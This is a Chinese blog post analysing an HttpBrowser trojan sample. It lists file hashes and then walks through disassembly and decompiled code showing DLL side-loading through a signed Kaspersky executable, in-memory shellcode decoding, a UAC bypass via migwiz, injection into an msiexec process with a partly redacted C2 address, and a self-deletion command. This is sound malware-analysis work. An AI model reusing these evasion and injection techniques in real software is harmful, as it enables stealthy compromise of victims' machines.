+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#一、样本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">一、样本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#二、行为分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">二、行为分析</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#三、样本分析总结"><span class="post-toc-number">3.</span> <span class="post-toc-text">三、样本分析总结</span></a></li></ol>
+        <!--
+        <li class="mdl-menu__item">
+            Some Action
+        </li>
+        -->
+    </ul>
+    
+
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                利用kaspersky白文件的恶意样本分析
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>b2ahex</strong>
+        <span>6月 27, 2017</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=利用kaspersky白文件的恶意样本分析&url=https://b2ahex.github.io/blog/blog/2017/06/27/利用kaspersky白文件的恶意样本分析/index.html&pic=&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=利用kaspersky白文件的恶意样本分析&url=https://b2ahex.github.io/blog/blog/2017/06/27/利用kaspersky白文件的恶意样本分析/index.html&via=b2ahex" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://b2ahex.github.io/blog/blog/2017/06/27/利用kaspersky白文件的恶意样本分析/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=https://b2ahex.github.io/blog/blog/2017/06/27/利用kaspersky白文件的恶意样本分析/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <p>之前分析过的样本，随便贴点东西上来吧…</p>
+<h1 id="一、样本信息"><a href="#一、样本信息" class="headerlink" title="一、样本信息"></a>一、样本信息</h1><blockquote>
+<p>样本名称：280836636_37EEC1A29D316ED1E5E766B599DC32A1.bin</p>
+<p>样本大小： 64,599 字节</p>
+<p>文件类型：EXE文件</p>
+<p>病毒名称：HttpBrowser</p>
+<p>样本MD5： 37eec1a29d316ed1e5e766b599dc32a1</p>
+<p>样本SHA256：a89c21dd608c51c4bf0323d640f816e464578510389f9edcf04cd34090decc91</p>
+</blockquote>
+<a id="more"></a>
+<h1 id="二、行为分析"><a href="#二、行为分析" class="headerlink" title="二、行为分析"></a>二、行为分析</h1><p><strong>280836636_37EEC1A29D316ED1E5E766B599DC32A1.bin 样本的主要行为分为释放3个文件，启动其中释放的样本EXE，提高优先级调用外部程序自删除，详细如下</strong>：</p>
+<p>1.获取TEMP路径,设置当前目录</p>
+<pre><code>push 0x0  
+push eax  
+mov byte ptr ss:[ebp-0x114],0x0
+call &lt;jmp.&amp;msvcrt.memset&gt;
+add esp,0x48
+lea eax,[local.69]
+push eax   ; /Buffer = 0017FD64
+push 0x104 ; |BufSize = 104 (260.)
+call dword ptr ds:[&lt;&amp;KERNEL32.GetTempPathA&gt;]
+lea eax,[local.69]
+push eax   ; /Path = &quot;C:\Users\admin\AppData\Local\Temp\&quot;
+call dword ptr ds:[&lt;&amp;KERNEL32.SetCurrentDirect&gt;
+</code></pre><p>2.连续3次使用zlib解码内存中的数据，释放到temp目录，并修改释放文件的时间属性</p>
+<pre><code>在 temp 目录释放解码之后的文件 并修改文件时间
+
+00F44310  |.  50                push eax
+00F44311  |.  FFB5 D4FEFFFF     push [local.75]; |Attributes = ARCHIVE|NORMAL
+00F44317  |.  6A 02             push 0x2   ; |Mode = CREATE_ALWAYS
+00F44319  |.  50                push eax   ; |pSecurity = NULL
+00F4431A  |.  50                push eax   ; |ShareMode = 0
+00F4431B  |.  68 00000040       push 0x40000000; |Access = GENERIC_WRITE
+00F44320  |.  53                push ebx   ; |msi.dll
+00F44321  |.  FF15 2C50F400     call dword ptr ds:[&lt;&amp;KERNEL32.CreateFileA&gt;]
+00F44327  |.  8BF0              mov esi,eax
+00F44329  |.  83FE FF           cmp esi,-0x1
+00F4432C  |.  75 0A             jnz short 28083663.00F44338
+00F4432E  |.  B8 00020000       mov eax,0x200
+00F44333  |.  E9 90000000       jmp 28083663.00F443C8
+00F44338  |&gt;  8B1F              mov ebx,dword ptr ds:[edi]
+00F4433A  |.  E8 F8F6FFFF       call 28083663.00F43A37
+00F4433F  |.  C645 0B 00        mov byte ptr ss:[ebp+0xB],0x0
+00F44343  |.  BB 00400000       mov ebx,0x4000
+00F44348  |.  EB 1B             jmp short 28083663.00F44365
+00F4434A  |&gt;  74 32 /            je short 28083663.00F4437E
+00F4434C  |.  6A 00 |            push 0x0  ; /pOverlapped = NULL
+00F4434E  |.  8D4D FC   |        lea ecx,[local.1] ; |
+00F44351  |.  51|                push ecx  ; |pBytesWritten = NULL
+00F44352  |.  50|                push eax  ; |nBytesToWrite = 0x0
+00F44353  |.  8D85 CCBDFFFF |    lea eax,[local.4237]  ; |
+00F44359  |.  50|                push eax  ; |Buffer = NULL
+00F4435A  |.  56|                push esi  ; |hFile = 005512B8
+00F4435B  |.  FF15 3850F400 |    call dword ptr ds:[&lt;&amp;KERNEL32.WriteFile&gt;]
+
+修改文件时间 -&gt; 2014‎年‎4‎月‎X日
+
+009E4390  |.  8D85 E8FEFFFF     lea eax,[local.70]
+009E4396  |.  50                push eax                                       ; /pLastWrite = 0031F104
+009E4397  |.  8D85 D8FEFFFF     lea eax,[local.74]                             ; |
+009E439D  |.  50                push eax                                       ; |pLastAccess = 0031F104
+009E439E  |.  8D85 E0FEFFFF     lea eax,[local.72]                             ; |
+009E43A4  |.  50                push eax                                       ; |pCreationTime = 0031F104
+009E43A5  |.  56                push esi                                       ; |hFile = 0000000C
+009E43A6  |.  FF15 34509E00     call dword ptr ds:[&lt;&amp;KERNEL32.SetFileTime&gt;]    ; \SetFileTime‎
+009E43AC  |&gt;  56                push esi                                       ; /hObject = 0000000C
+009E43AD  |.  FF15 4C509E00     call dword ptr ds:[&lt;&amp;KERNEL32.CloseHandle&gt;]    ; \CloseHandle
+</code></pre><p>样本一共释放了3个文件，其中Setup.exe 是Kaspersky的文件，这里用于dll劫持，白加黑</p>
+<p>文件信息如下：</p>
+<blockquote>
+<p>Filepath：   %TEMP%\msi.dll</p>
+<p>Size：       4.5KiB (4608 bytes)</p>
+<p>Type：       PE32 (DLL)</p>
+<p>MD5：<br>cab40c98344ab44d2701b7b9c2efcbfa</p>
+<p>SHA1：<br>69d899d6e737551f6dadc79286b3fec9d731e0fb</p>
+<p>SHA256：<br>0101ad43ba1a3b7daf650942c31a92347a54d07eac2a8c6b2f7ae0af42046540</p>
+</blockquote>
+<p>=======================================================================</p>
+<blockquote>
+<p>Filepath：<br>%TEMP%\msi.dll.url</p>
+<p>Size：<br>18KiB (18510 bytes)</p>
+<p>Type：<br>datafile（Shellcode + Dll）</p>
+<p>MD5：<br>3b1f4b2856bd8055c2a0d9a8e895d44e</p>
+<p>SHA1：<br>0e57e7cd58a817e140068da60721a57e9ffebf17</p>
+<p>SHA256：<br>5d0fa65d7f86f310b71561ec6a62961226077daefe73f108dc305e3764e40231</p>
+</blockquote>
+<p>========================================================================</p>
+<blockquote>
+<p>Filepath：<br>%TEMP%\setup.exe</p>
+<p>Size：<br>34KiB (34424 bytes)</p>
+<p>Type：<br>PE32 EXE</p>
+<p>MD5：<br>d00b3169f45e74bb22a1cd684341b14a</p>
+<p>SHA1：<br>2d8e43f9f8ef6cdf0cafb170a65cb27d37fb166d</p>
+<p>SHA256：<br>83f40e70ea3ba0e614d08f1070dafe75092660003b8a1f8b563d4f5b012f</p>
+</blockquote>
+<p>3.启动刚释放的Setup.exe</p>
+<pre><code>009E122E |.  57                    push edi
+009E122F |.  8D85 E9FDFFFF         lea eax,dword ptr ss:[ebp-0x217]   ; |
+009E1235 |.  53                    push ebx   ; |c = 00
+009E1236 |.  50                    push eax   ; |s = 0031F680
+009E1237 |.  889D E8FDFFFF         mov byte ptr ss:[ebp-0x218],bl ; |
+009E123D |.  E8 BA340000           call &lt;jmp.&amp;msvcrt.memset ; \memset
+009E1242 |.  83C4 10               add esp,0x10
+009E1245 |.  8D85 ECFEFFFF         lea eax,[local.69]
+009E124B |.  50                    push eax   ; / &quot;C:\Users\admin\AppData\Local\Temp\\setup.exe&quot;
+009E124C |.  8D85 E8FDFFFF         lea eax,[local.134]
+009E1252 |.  50                    push eax
+009E1253 |.  FF15 24509E00         call dword ptr ds:[&lt;&amp;KERNEL32.lstrcpyA&gt;]   ; \lstrcpyA
+009E1259 |.  68 14519E00           push 28083663.009E5114 ; /StringToAdd = &quot;\setup.exe&quot;
+009E125E |.  8D85 E8FDFFFF         lea eax,[local.134]; |
+009E1264 |.  50                    push eax   ; |ConcatString = &quot;C:\Users\admin\AppData\Local\Temp\\setup.exe&quot;
+009E1265 |.  FF15 10509E00         call dword ptr ds:[&lt;&amp;KERNEL32.lstrcatA&gt;]   ; \lstrcatA
+009E126B |.  8B35 58509E00         mov esi,dword ptr ds:[&lt;&amp;SHELL32.ShellExecuteA&gt;&gt;;  shell32.ShellExecuteA
+009E1271 |.  6A 05                 push 0x5   ; /IsShown = 0x5
+009E1273 |.  8D85 ECFEFFFF         lea eax,[local.69] ; |
+009E1279 |.  50                    push eax   ; |DefDir = &quot;C:\Users\admin\AppData\Local\Temp\\setup.exe&quot;
+009E127A |.  53                    push ebx   ; |Parameters = NULL
+009E127B |.  8D85 E8FDFFFF         lea eax,[local.134]; |
+009E1281 |.  50                    push eax   ; |FileName = &quot;C:\Users\admin\AppData\Local\Temp\\setup.exe&quot;
+009E1282 |.  BF 20519E00           mov edi,28083663.009E5120
+009E1287 |.  57                    push edi   ; |Operation = &quot;open&quot;
+009E1288 |.  53                    push ebx   ; |hWnd = NULL
+009E1289 |.  FFD6                  call esi   ; \ShellExecuteA
+</code></pre><p>4.提高自身优先级，自身进程退出后，通过外部命令实现程序自删除</p>
+<pre><code>009E12AD |.  59                    pop ecx
+009E12AE |.  59                    pop ecx
+009E12AF |.  68 00010000          push 0x100                                     ; /Priority = REALTIME_PRIORITY_CLASS
+009E12B4 |.  8818                  mov byte ptr ds:[eax],bl                       ; |
+009E12B6 |.  FF15 04509E00         call dword ptr ds:[&lt;&amp;KERNEL32.GetCurrentProces&gt;; |[GetCurrentProcess
+009E12BC |.  50                    push eax                                       ; |hProcess = 0031F23C
+009E12BD |.  FF15 00509E00         call dword ptr ds:[&lt;&amp;KERNEL32.SetPriorityClass&gt;; \SetPriorityClass
+009E12C3 |.  6A 0F                 push 0xF                                       ; /Priority = THREAD_PRIORITY_TIME_CRITICAL
+009E12C5 |.  FF15 08509E00         call dword ptr ds:[&lt;&amp;KERNEL32.GetCurrentThread&gt;; |[GetCurrentThread
+009E12CB |.  50                    push eax                                       ; |hThread = 0031F23C
+009E12CC |.  FF15 14509E00         call dword ptr ds:[&lt;&amp;KERNEL32.SetThreadPriorit&gt;; \SetThreadPriority
+009E12D2 |.  FF15 0C509E00         call dword ptr ds:[&lt;&amp;KERNEL32.GetCommandLineA&gt;&gt;; [GetCommandLineA
+009E12D8 |.  50                    push eax                                       ; /&lt;%s&gt; = &quot;/c del /q &quot;C:\Users\admin\Desktop\280836636_37EEC1A29D316ED1E5E766B599DC32A1.bin&quot;&quot;
+009E12D9 |.  8D85 A4F9FFFF         lea eax,[local.407]                            ; |
+009E12DF |.  68 28519E00           push 28083663.009E5128                         ; |Format = &quot;/c del /q %s&quot;
+009E12E4 |.  50                    push eax                                       ; |s = 0031F23C
+009E12E5 |.  FF15 60509E00         call dword ptr ds:[&lt;&amp;USER32.wsprintfA&gt;]        ; \wsprintfA
+009E12EB |.  83C4 0C               add esp,0xC
+009E12EE |.  53                    push ebx
+009E12EF |.  8D85 B4FAFFFF         lea eax,[local.339]
+009E12F5 |.  50                    push eax
+009E12F6 |.  8D85 A4F9FFFF         lea eax,[local.407]
+009E12FC |.  50                    push eax
+009E12FD |.  68 38519E00           push 28083663.009E5138                         ;  ASCII 63,&quot;cmd.exe&quot;
+009E1302 |.  57                    push edi                                       ;  28083663.009E5120
+009E1303 |.  53                    push ebx
+009E1304 |.  FFD6                  call esi                                       ;  shell32.ShellExecuteA
+</code></pre><p><strong>Setup.exe 样本的主要行为是加载起刚刚释放的msi.dll，是Kaspersky的EXE，这里用于加载恶意dll</strong></p>
+<p>（ps：这个EXE带有Kaspersky Lab的数字签名证书）</p>
+<pre><code>加载释放的dll文件
+0040146F                         |.  68 8C414000         push setup.0040418C   ; /FileName = &quot;msi.dll&quot;
+00401474                          |.  FF15 2C404000       call dword ptr ds:[&lt;&amp;KERNEL32.LoadLibraryA&gt;]  ; \LoadLibraryA
+</code></pre><p><strong>msi.dll 样本的主要功能为将 msi.dll.url 文件 读入内存，并执行其shellcode</strong>    </p>
+<pre><code>读取msi.dll.url文件到内存
+1000034C         68 A40A0010          push msi.10000AA4 ; ASCII &quot;.url&quot;
+10000351         8D95 E8FEFFFF        lea edx,dword ptr ss:[ebp-0x118]
+10000357         52                   push edx
+10000358         FF15 100A0010        call dword ptr ds:[&lt;&amp;KERNEL32.lstrcatA&gt;]  ; kernel32.lstrcatA
+1000035E         6A 00                push 0x0
+10000360         6A 00                push 0x0
+10000362         6A 03                push 0x3
+10000364         6A 00                push 0x0
+10000366         6A 01                push 0x1
+10000368         68 00000080          push 0x80000000
+1000036D         8D85 E8FEFFFF        lea eax,dword ptr ss:[ebp-0x118]
+10000373         50                   push eax
+10000374         FF15 000A0010        call dword ptr ds:[&lt;&amp;KERNEL32.CreateFileA&gt;]   ; kernel32.CreateFileA
+1000037A         8985 E0FEFFFF        mov dword ptr ss:[ebp-0x120],eax
+10000380         83BD E0FEFFFF FF     cmp dword ptr ss:[ebp-0x120],-0x1
+10000387         0F84 86000000        je msi.10000413
+1000038D         6A 00                push 0x0
+1000038F         8B8D E0FEFFFF        mov ecx,dword ptr ss:[ebp-0x120]
+10000395         51                   push ecx
+10000396         FF15 040A0010        call dword ptr ds:[&lt;&amp;KERNEL32.GetFileSize&gt;]   ; kernel32.GetFileSize
+1000039C         8945 F8              mov dword ptr ss:[ebp-0x8],eax
+1000039F         837D F8 00           cmp dword ptr ss:[ebp-0x8],0x0
+100003A3         76 61                jbe short msi.10000406
+100003A5         6A 40                push 0x40
+100003A7         68 00100000          push 0x1000
+100003AC         8B55 F8              mov edx,dword ptr ss:[ebp-0x8]
+100003AF         83C2 01              add edx,0x1
+100003B2         52                   push edx
+100003B3         6A 00                push 0x0
+100003B5         FF15 140A0010        call dword ptr ds:[&lt;&amp;KERNEL32.VirtualAlloc&gt;]  ; kernel32.VirtualAlloc
+100003BB         8945 FC              mov dword ptr ss:[ebp-0x4],eax
+100003BE         837D FC 00           cmp dword ptr ss:[ebp-0x4],0x0
+100003C2         74 42                je short msi.10000406
+100003C4         6A 00                push 0x0
+100003C6         6A 00                push 0x0
+100003C8         6A 00                push 0x0
+100003CA         8B85 E0FEFFFF        mov eax,dword ptr ss:[ebp-0x120]
+100003D0         50                   push eax
+100003D1         FF15 080A0010        call dword ptr ds:[&lt;&amp;KERNEL32.SetFilePointer&gt;]; kernel32.SetFilePointer
+100003D7         6A 00                push 0x0
+100003D9         8D8D E4FEFFFF        lea ecx,dword ptr ss:[ebp-0x11C]
+100003DF         51                   push ecx
+100003E0         8B55 F8              mov edx,dword ptr ss:[ebp-0x8]
+100003E3         52                  push edx    
+100003E4         8B45 FC              mov eax,dword ptr ss:[ebp-0x4]
+100003E7         50                   push eax
+100003E8         8B8D E0FEFFFF        mov ecx,dword ptr ss:[ebp-0x120]
+100003EE         51                  push ecx
+100003EF         FF15 0C0A0010        call dword ptr ds:[&lt;&amp;KERNEL32.ReadFile&gt;]  ; kernel32.ReadFile
+</code></pre><p><strong>msi.dll.url 文件的主要功能为执行shellcode，从自身数据段解码出一个dll可执行文件，修复其导入表，然后在内存中执行，该解码出来的dll为木马的主体，shllcode分析如下:</strong></p>
+<p>1.跳转到msi.dll.url，执行Shellcode，进行代码SMC动态自解密，获得下面的shellcode</p>
+<pre><code>00340015             317B 16                          xor dword ptr ds:[ebx+0x16],edi
+00340018             037B 16                          add edi,dword ptr ds:[ebx+0x16]
+0034001B           ^ E2 F5                            loopd short 00340012
+0034001D             E8 FB090000                      call 00340A1D
+00340022             C3                               retn
+00340023             CC                               int3
+00340024             CC                               int3
+00340025             CC                               int3
+00340026             CC                               int3
+00340027             CC                               int3
+00340028             CC                               int3
+00340029             CC                               int3
+0034002A             CC                               int3
+0034002B             CC                               int3
+0034002C             CC                               int3
+0034002D             55                               push ebp
+</code></pre><p>2.计算哈希在ntdll找到指定api</p>
+<pre><code>003400C8 55           push ebp
+003400C9 8BEC         mov ebp,esp
+003400CB 51           push ecx  ; ntdll.76FA5618
+003400CC 53          push ebx  ; ntdll.76FAA312
+003400CD 52           push edx  ; ntdll.76FA9310
+003400CE 33C9         xor ecx,ecx   ; ntdll.76FA5618
+003400D0 33DB         xor ebx,ebx   ; ntdll.76FAA312
+003400D2 33D2         xor edx,edx   ; ntdll.76FA9310
+003400D4 8B45 08      mov eax,dword ptr ss:[ebp+0x8]
+003400D7 8A10         mov dl,byte ptr ds:[eax]
+003400D9 80CA 60      or dl,0x60
+003400DC 03DA         add ebx,edx   ; ntdll.76FA9310
+003400DE D1E3         shl ebx,1
+003400E0 0345 10      add eax,dword ptr ss:[ebp+0x10]
+003400E3 8A08         mov cl,byte ptr ds:[eax]
+003400E5 84C9         test cl,cl
+003400E7 ^ E0 EE    loopdne short 003400D7
+003400E9 33C0         xor eax,eax
+003400EB 8B4D 0C      mov ecx,dword ptr ss:[ebp+0xC]
+003400EE 3BD9         cmp ebx,ecx   ; ntdll.76FA5618
+003400F0 74 01        je short 003400F3
+003400F2 40           inc eax
+003400F3 5A           pop edx      
+
+获取以下API地址：
+    memcpy
+    memset
+    RtlAllocateHeap
+    RtlReAllocateHeap
+    LoadLibraryA
+    GetProcAddress
+    VirtualAlloc
+    VirtualProtect
+    VirtualFree
+    IsBadReadPtr
+    GetProcessHeap
+    RtlDecompressBuffer
+
+003408DD                         55                               push ebp
+003408DE                         8BEC                             mov ebp,esp
+003408E0                         68 7A340000                      push 0x347A
+003408E5                         68 08B70100                      push 0x1B708
+003408EA                         E8 3EF7FFFF                      call &lt;Getfuncaddr&gt;                                            ; memcpy
+003408EF                         83C4 08                          add esp,0x8
+003408F2                         8B4D 08                          mov ecx,dword ptr ss:[ebp+0x8]
+003408F5                         8941 0C                          mov dword ptr ds:[ecx+0xC],eax                                
+003408F8                         68 C4340000                      push 0x34C4
+003408FD                         68 08B70100                      push 0x1B708
+00340902                         E8 26F7FFFF                      call &lt;Getfuncaddr&gt;                                            ; memset
+00340907                         83C4 08                          add esp,0x8
+0034090A                         8B55 08                          mov edx,dword ptr ss:[ebp+0x8]
+0034090D                         8942 10                          mov dword ptr ds:[edx+0x10],eax                               
+00340910                         68 2C477000                      push 0x70472C
+00340915                         68 08B70100                      push 0x1B708
+0034091A                         E8 0EF7FFFF                      call &lt;Getfuncaddr&gt;                                            ; RtlAllocateHeap                              
+.....
+</code></pre><p>3.调用RtlDecompressBuffer解压出一个pe文件（dll） 核心木马</p>
+<pre><code>00340867                         6A 00                            push 0x0
+00340869                         8B55 08                          mov edx,dword ptr ss:[ebp+0x8]
+0034086C                         8B42 24                          mov eax,dword ptr ds:[edx+0x24]
+0034086F                         FFD0                             call eax                                                      ; VirtualAlloc
+00340871                         8945 FC                          mov dword ptr ss:[ebp-0x4],eax
+00340874                         837D FC 00                       cmp dword ptr ss:[ebp-0x4],0x0
+00340878                         74 38                            je short 003408B2
+0034087A                         8B4D 18                          mov ecx,dword ptr ss:[ebp+0x18]
+0034087D                         51                               push ecx
+0034087E                         8B55 14                          mov edx,dword ptr ss:[ebp+0x14]
+00340881                         52                               push edx
+00340882                         8B45 10                          mov eax,dword ptr ss:[ebp+0x10]
+00340885                         8B08                             mov ecx,dword ptr ds:[eax]
+00340887                         51                               push ecx
+00340888                         8B55 18                          mov edx,dword ptr ss:[ebp+0x18]
+0034088B                         8B02                             mov eax,dword ptr ds:[edx]
+0034088D                         50                               push eax
+0034088E                         8B4D FC                          mov ecx,dword ptr ss:[ebp-0x4]
+00340891                         51                               push ecx
+00340892                         0FB755 0C                        movzx edx,word ptr ss:[ebp+0xC]
+00340896                         52                               push edx
+00340897                         8B45 08                          mov eax,dword ptr ss:[ebp+0x8]
+0034089A                         8B48 30                          mov ecx,dword ptr ds:[eax+0x30]
+0034089D                         FFD1                             call ecx                                                      ; RtlDecompressBuffer
+</code></pre><p>4.动态加载WININET，ws2_32，kernel32，user32，ADVAPI32.dll，shell32，ole32，msvcr模块，并获取所需API地址,修复内存DLL导入地址表，并最终调转到核心木马dll</p>
+<pre><code>00340536                         8B45 F0             mov eax,dword ptr ss:[ebp-0x10]
+00340539                         8B4D F4             mov ecx,dword ptr ss:[ebp-0xC]
+0034053C                         0348 0C             add ecx,dword ptr ds:[eax+0xC]
+0034053F                         51                  push ecx
+00340540                         8B55 08             mov edx,dword ptr ss:[ebp+0x8]
+00340543                         8B02                mov eax,dword ptr ds:[edx]                
+00340545                         FFD0                call eax                                   ; LoadLibraryA
+00340547                         8945 E4             mov dword ptr ss:[ebp-0x1C],eax            
+0034054A                         837D E4 FF          cmp dword ptr ss:[ebp-0x1C],-0x1
+0034054E                         75 0C               jnz short 0034055C
+00340550                         C745 F8 00000000    mov dword ptr ss:[ebp-0x8],0x0
+00340557                         E9 20010000         jmp 0034067C
+0034055C                         8B4D 0C             mov ecx,dword ptr ss:[ebp+0xC]
+0034055F                         8B51 0C             mov edx,dword ptr ds:[ecx+0xC]
+00340562                         8D0495 04000000     lea eax,dword ptr ds:[edx*4+0x4]
+00340639                         8B55 E8             mov edx,dword ptr ss:[ebp-0x18]
+0034063C                         8B45 F4             mov eax,dword ptr ss:[ebp-0xC]
+0034063F                         0302                add eax,dword ptr ds:[edx]                 
+00340641                         8945 E0             mov dword ptr ss:[ebp-0x20],eax
+00340644                         8B4D E0             mov ecx,dword ptr ss:[ebp-0x20]
+00340647                         83C1 02             add ecx,0x2
+0034064A                         51                  push ecx                                 
+0034064B                         8B55 E4             mov edx,dword ptr ss:[ebp-0x1C]           
+0034064E                         52                  push edx
+0034064F                         8B45 08             mov eax,dword ptr ss:[ebp+0x8]
+00340652                         8B48 04             mov ecx,dword ptr ds:[eax+0x4]
+00340655                         FFD1                call ecx                                   ; GetFuncAddress
+00340657                         8B55 EC             mov edx,dword ptr ss:[ebp-0x14]
+0034065A                         8902                mov dword ptr ds:[edx],eax
+0034065C                         8B45 EC             mov eax,dword ptr ss:[ebp-0x14]
+0034065F                         8338 00             cmp dword ptr ds:[eax],0x0
+00340662                         75 09               jnz short 0034066D
+00340664                         C745 F8 00000000    mov dword ptr ss:[ebp-0x8],0x0
+0034066B                         EB 02               jmp short 0034066F
+0034066D                       ^ EB 85               jmp short 003405F4
+0034066F                         837D F8 00          cmp dword ptr ss:[ebp-0x8],0x0
+</code></pre><p><strong>木马核心DLL分析：</strong></p>
+<p>1.<br>核心dll在初次运行时会将temp目录下释放的3个文件移动到C:\ProgramData\kav\目录，并将setup.exe重命名为svchost.exe  </p>
+<pre><code>GetModuleFileNameW(v0, v16, v17);
+if ( lstrcmpW(&amp;Filename, &amp;String1) )
+{
+  GetTempPathW(0x104u, &amp;Buffer);
+  GetTempFileNameW(&amp;PathName, &amp;PrefixString, 0x10u, &amp;PathName);
+  SetFileAttributesW(&amp;String1, 0x80u);
+  MoveFileExW(&amp;String1, &amp;PathName, 1u);
+  MoveFileExW(&amp;PathName, 0, 4u);
+  MoveFileExW(&amp;Filename, &amp;String1, 3u);
+  lstrcpyW(&amp;NewFileName, &amp;String2);
+  lstrcatW(&amp;NewFileName, &amp;word_364808);
+  MoveFileW(&amp;ExistingFileName, &amp;NewFileName);
+  lstrcpyW(&amp;v4, &amp;String2);
+  lstrcatW(&amp;v4, &amp;word_3646D4);
+  MoveFileW(&amp;word_36482C, &amp;v4);
+}
+</code></pre><p>2.<br>利用migwiz白名单程序绕过UAC  </p>
+<pre><code>  Parameters = 0;
+((void (__cdecl *)(char *, _DWORD, _DWORD))dword_363AD8)(&amp;v13, 0, 518);
+wsprintfW(&amp;Parameters, &amp;word_364624, v11, v2);
+Buffer = 0;
+((void (__cdecl *)(char *, _DWORD, _DWORD))dword_363AD8)(&amp;v15, 0, 518);
+GetSystemDirectoryW(&amp;Buffer, 0x103u);
+lstrcatW(&amp;Buffer, L&quot;\\migwiz\\migwiz.exe&quot;);
+if ( sub_3631AF() )
+{
+  v3 = GetModuleHandleW(&amp;ModuleName);
+  v10 = GetProcAddress(v3, ProcName);
+  v4 = GetModuleHandleW(&amp;ModuleName);
+  v5 = GetProcAddress(v4, byte_364664);
+  v6 = v5;
+  v11 = 0;
+  if ( v10 &amp;&amp; v5 )
+  {
+    if ( ((int (__stdcall *)(int *))v10)(&amp;v11) )
+    {
+      ShellExecuteW(0, &amp;Operation, &amp;Buffer, &amp;Parameters, &amp;String2, 5);
+      ((void (__stdcall *)(int))v6)(v11);
+    }
+  }
+}
+else
+</code></pre><p>3.<br>创建msiexec傀儡进程,远程写入从.url文件中提取的shellcode，并创建远程线程执行，注意上线地址和端口已经通过CreateProcess的参数传递给傀儡进程</p>
+<pre><code>0012E9D0   0012EC68  |ModuleFileName = &quot;C:\Windows\system32\msiexec.exe&quot;
+0012E9D4   0012EA60  |CommandLine = &quot; 103.xx.x.x4 443 1&quot;
+0012E9D8   00000000  |pProcessSecurity = NULL
+0012E9DC   00000000  |pThreadSecurity = NULL
+0012E9E0   00000001  |InheritHandles = TRUE
+0012E9E4   00000004  |CreationFlags = CREATE_SUSPENDED
+0012E9E8   00000000  |pEnvironment = NULL
+0012E9EC   00000000  |CurrentDir = NULL
+0012E9F0   0012EA04  |pStartupInfo = 0012EA04
+0012E9F4   0012EA48  \pProcessInfo = 0012EA48
+0012E9F8   00364714  ASCII &quot;443&quot;
+
+00362878                         FF15 D4403600       call dword ptr ds:[0x3640D4]               ; kernel32.VirtualAlloc
+0036287E                         8985 E0F9FFFF       mov dword ptr ss:[ebp-0x620],eax
+00362884                         3BC6                cmp eax,esi
+00362886                         74 28               je short 003628B0
+00362888                         56                  push esi
+00362889                         56                  push esi
+0036288A                         56                  push esi
+0036288B                         53                  push ebx
+0036288C                         FF15 64403600       call dword ptr ds:[0x364064]               ; kernel32.SetFilePointer
+00362892                         56                  push esi
+00362893                         8D85 DCF9FFFF       lea eax,dword ptr ss:[ebp-0x624]
+00362899                         50                  push eax
+0036289A                         57                  push edi
+0036289B                         FFB5 E0F9FFFF       push dword ptr ss:[ebp-0x620]
+003628A1                         53                  push ebx
+003628A2                         FF15 D0403600       call dword ptr ds:[0x3640D0]               ; kernel32.ReadFile
+003628A8                         39BD DCF9FFFF       cmp dword ptr ss:[ebp-0x624],edi
+003628AE                       ^ 75 A7               jnz short 00362857
